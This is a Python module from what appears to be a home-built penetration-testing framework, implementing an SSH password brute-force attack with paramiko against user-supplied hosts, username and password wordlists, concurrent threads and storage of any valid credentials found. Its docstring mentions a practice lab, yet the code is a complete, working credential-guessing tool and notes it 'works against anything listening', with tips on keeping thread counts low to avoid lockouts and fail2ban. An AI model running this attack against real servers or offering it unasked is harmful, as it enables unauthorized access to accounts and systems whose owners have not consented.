"""SSH password brute force (paramiko).

First module to use the requirements convention: paramiko is imported
lazily so the file loads fine without it, and the console refuses to run
until it's installed (pip install paramiko / pacman -S python-paramiko).

Notes from the field:
  - THREADS stays low: sshd's MaxAuthTries (default 6 per connection is
    fine — we open one connection per attempt — but rate limiting and
    fail2ban are not). 2-4 is sane for labs, 1 for jumpy networks.
  - look_for_keys=False / allow_agent=False: we're testing PASSWORDS, not
    your keyring.
  - Stored creds for the host are tried before the wordlist ('creds').
"""

import socket
import time

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptInt, OptPort, OptString
from core.wordlists import build_combos, creds_from_options

try:
    import paramiko
except ImportError:
    paramiko = None  # console gates run() on requirements


class SshLogin(AuxiliaryModule):
    name = "SSH Login Brute Force"
    description = """
        Tries username/password combinations over SSH. Built for the ssh
        lab (lab up ssh: admin:admin, user:password, root:toor) but works
        against anything listening. Verifies with a real auth handshake,
        so a 'valid' result is a credential you can actually use.
    """
    authors = ["you"]
    requirements = ["paramiko"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=22, description="SSH port"))
        self.options.add(OptString("USERNAME", default="", description="Single username"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptBool("STOP_ON_SUCCESS", default=True,
                                 description="Stop after the first valid credential"))
        self.options.add(OptInt("THREADS", default=2,
                                description="Concurrent attempts (keep low: lockouts)"))
        self.options.add(OptInt("TIMEOUT", default=5, description="Connect timeout (seconds)"))

    # ------------------------------------------------------------------ probing
    def _try(self, host, port, timeout, user, password):
        """One real SSH auth handshake -> success | fail | error."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port, username=user, password=password,
                timeout=timeout, banner_timeout=timeout, auth_timeout=timeout,
                look_for_keys=False, allow_agent=False,
            )
            return "success"
        except paramiko.AuthenticationException:
            return "fail"
        except (paramiko.SSHException, EOFError, socket.error, OSError) as e:
            self.print_debug(
                f"{host}:{port} {user}:{password} -> {type(e).__name__}: {e}"
            )
            return "error"
        finally:
            client.close()

    # -------------------------------------------------------------------- run
    def run(self):
        try:
            users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
            passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
        except OSError as e:
            self.print_error(f"Cannot read credential file: {e}")
            return
        if not users or not passwords:
            self.print_error("Need at least one username and one password "
                             "(USERNAME/USER_FILE, PASSWORD/PASS_FILE)")
            return

        port = self.get_option("RPORT")
        timeout = self.get_option("TIMEOUT")
        combos = list(build_combos(users, passwords))
        self.print_status(
            f"{len(users)} user(s) x {len(passwords)} password(s) = "
            f"{len(combos)} combinations"
        )
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._attack_host(host, port, timeout, combos)

    def _attack_host(self, host, port, timeout, combos):
        store = getattr(self.framework, "store", None)
        if store is not None:
            stored = store.creds_for(host, "ssh")
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first"
                )
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        attempt = lambda u, p: self._try(host, port, timeout, u, p)  # noqa: E731
        classify = lambda verdict: verdict  # noqa: E731  (attempt returns verdicts)

        def on_success(combo, _result):
            self.print_good(f"{host}: valid credential {combo[0]}:{combo[1]}")

        def on_error(_combo, _result, count):
            if count == 1:
                self.print_warning(
                    f"{host}: SSH error (host down, or rate limited?)"
                )

        started = time.time()
        found, attempts, errors = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
            on_error=on_error,
        )
        elapsed = max(time.time() - started, 0.001)
        self.print_status(
            f"{host}: {attempts} attempts in {elapsed:.1f}s, "
            f"{len(found)} valid, {errors} errors"
        )

        if store is not None and found:
            store.add_service(host, port, name="ssh")
            for user, pw in found:
                store.add_cred(host, "ssh", user, pw, source="ssh-brute")
                self.print_status("Credential saved ('creds' to view)")
